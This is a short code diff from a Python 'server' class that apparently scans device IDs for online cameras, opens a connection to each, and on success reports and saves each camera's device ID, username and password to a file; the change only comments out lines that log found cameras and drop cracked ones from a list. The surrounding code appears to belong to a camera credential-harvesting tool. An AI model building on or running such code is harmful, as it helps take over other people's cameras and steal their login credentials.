@@ -118,8 +118,8 @@ class server:
                 if response[4] == 1:
                     print(f'\u001b[32m[+] Camera with device ID: {i} is online!\u001b[37m')
                     # Append-adds at last
-                    with open(self.FileListCams, "a") as f:
-                        f.write(f"{i}\n")
+                    # with open(self.FileListCams, "a") as f:
+                    #     f.write(f"{i}\n")
 
                     process = multiprocessing.Process(target=self.CreateSocket, args=(i,))
                     process.start()
@@ -160,8 +160,8 @@ class server:
                 self.send_msg(f'[+] DeviceID:{d["id"]}'
                               f'[+] Username: {username}'
                               f'[+] Password: {password}')
-                self.CamsList.remove(d["id"])
-                self.SaveCams(self.CamsList)
+                # self.CamsList.remove(d["id"])
+                # self.SaveCams(self.CamsList)
                 with open(self.PassFile, "a") as f:
                     f.write(f"{d['id']}:{str(username)}:{str(password)}\n")
                 relay_s.close()
